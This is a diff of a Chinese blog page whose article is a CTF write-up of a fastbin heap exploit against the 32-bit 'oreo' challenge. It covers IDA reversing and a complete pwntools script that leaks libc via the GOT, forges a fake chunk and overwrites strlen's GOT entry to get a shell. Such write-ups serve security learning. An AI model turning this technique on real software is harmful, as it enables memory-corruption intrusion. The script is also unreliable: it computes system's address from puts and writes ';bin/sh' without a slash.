@@ -22,19 +22,19 @@
 <meta property="og:site_name" content="refrain的blog">
 <meta property="og:description" content="前言本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/1-1633514214756.png">
-<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/2-1633514581457.png">
-<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/3-1633515155557.png">
-<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/4-1633515069147.png">
+<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/1.png">
+<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/2.png">
+<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/3.png">
+<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/4.png">
 <meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/6.png">
 <meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/5.png">
-<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/7-1633617863879.png">
+<meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/7.png">
 <meta property="og:image" content="http://example.com/2021/10/03/fastbin-attack/8.png">
 <meta property="article:published_time" content="2021-10-03T14:35:36.000Z">
-<meta property="article:modified_time" content="2021-10-07T14:52:10.460Z">
+<meta property="article:modified_time" content="2021-10-08T04:21:58.424Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/10/03/fastbin-attack/1-1633514214756.png">
+<meta name="twitter:image" content="http://example.com/2021/10/03/fastbin-attack/1.png">
   
   
     <link rel="icon" href="/css/images/favicon.ico">
@@ -92,7 +92,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/10/03/fastbin-attack/" data-id="ckuh26lp20002ywvk947o3s6l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/10/03/fastbin-attack/" data-id="ckuhv42x80000mgvka6ad4320" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -101,13 +101,13 @@
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧</p>
 <span id="more"></span>
 
-<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p><img src="/2021/10/03/fastbin-attack/1-1633514214756.png" alt="1"></p>
+<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p><img src="/2021/10/03/fastbin-attack/1.png" alt="1"></p>
 <p>老样子，先执行文件看一下大概功能，大概是这6个，然后扔进32位的ida</p>
 <p>找到main函数，发现他就是执行了这个函数将他命名位menu菜单函数，这题也是典型的菜单题。</p>
 <p>功能大概添加武器，展示武器，订购武器，为你的订购留下信息，最后就是展示大概情况吧。</p>
-<p><img src="/2021/10/03/fastbin-attack/2-1633514581457.png" alt="2"></p>
+<p><img src="/2021/10/03/fastbin-attack/2.png" alt="2"></p>
 <p>我们将每个函数功能改成合适的名字，在ida里面拖黄按n就可以改，我们先看add函数</p>
-<p><img src="/2021/10/03/fastbin-attack/3-1633515155557.png" alt="3"></p>
+<p><img src="/2021/10/03/fastbin-attack/3.png" alt="3"></p>
 <p>我们一行行看，如果有一些数据命名不一样就是我用上面的方法自己改的，为了美观。</p>
 <p>首先 v1会记录上一个chunk的地址，然后新malloc一个chunk并将chunk地址赋值给原先chunk_addr这个指针</p>
 <p>然后，将上一个chunk的地址也就是v1，赋值到chunk_addr + 13*4个字节的位置，乘4时因为DWORD四个字节</p>
@@ -121,7 +121,7 @@
 <p>​    char *last_chunk_addr</p>
 <p>}</p>
 <p>下面是show函数</p>
-<p><img src="/2021/10/03/fastbin-attack/4-1633515069147.png" alt="4"></p>
+<p><img src="/2021/10/03/fastbin-attack/4.png" alt="4"></p>
 <p>这个比较容易看，就是一个循环遍历通过单链表的指针把之前每个武器的name和decription打印出来</p>
 <p>另外一个比较重要的order函数</p>
 <p><img src="/2021/10/03/fastbin-attack/6.png" alt="6"></p>
@@ -135,7 +135,7 @@
 <p>from pwn import *<br>p = process(“./oreo”)<br>elf = ELF(“./oreo”)<br>libc =ELF(‘/lib32/libc.so.6’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’<br>def add(name,desc):<br>    p.sendline(‘1’)<br>    p.sendline(name)<br>    p.sendline(desc)<br>def show():<br>    p.sendline(‘2’)<br>def order():<br>    p.sendline(‘3’)<br>def leave(msg):<br>    p.sendline(‘4’)<br>    p.sendline(msg)<br>name = b’a’*27 +p32(elf.got[‘puts’])<br>desc = b’b’*25<br>add(name,desc)<br>show()<br>p.recvuntil(‘Description: ‘)<br>#p.recvuntil(‘Name: ‘)<br>p.recvuntil(‘Description: ‘)<br>puts_addr = u32(p.recv(4))<br>libc_base = puts_addr - libc.symbols[“puts”]<br>system_addr = libc_base + libc.symbols[“puts”]<br>#gdb.attach(p)<br>target = 0x0804A2A8<br>for i in range(0x3e):<br>    add(b’a’*27+p32(0),b’a’*25)<br>vulnname = b’a’*27 + p32(target)<br>add(vulnname,b’a’*25)<br>padding = 0x38-(0xc0-0xa8)-4<br>payload = b’a’*padding+b’\x00’*4+b’a’*4+p32(0x40)<br>leave(payload)<br>order()<br>strlen_got_addr = p32(elf.got[‘strlen’])<br>add(b’b’,strlen_got_addr)<br>leave(p32(system_addr) + b’;bin/sh’)<br>#gdb.attach(p)<br>p.interactive()</p>
 <p>这里我本地是完成getshell的交互了，但是不知道为什么输入命令行就EOF了…应该是本地libc小版本有问题，先不管了吧，比赛时候会给libc的。</p>
 <p>然后贴一下0x804a2a8的调试结果</p>
-<p><img src="/2021/10/03/fastbin-attack/7-1633617863879.png" alt="7"></p>
+<p><img src="/2021/10/03/fastbin-attack/7.png" alt="7"></p>
 <p><img src="/2021/10/03/fastbin-attack/8.png" alt="8"></p>
 <p>一开始自己死活不明白为什么写进去的是strlen的got表地址，再写system的地址就可以完成覆写，这里发现原来leave是通过内存中的指针进行写入的，而add是直接写入内存，所以还是要多动手实践。</p>
 <p>然后就是构造fake_chunk的细节：next_chunk的size位要不大不小，自己的size要满足fastbin</p>
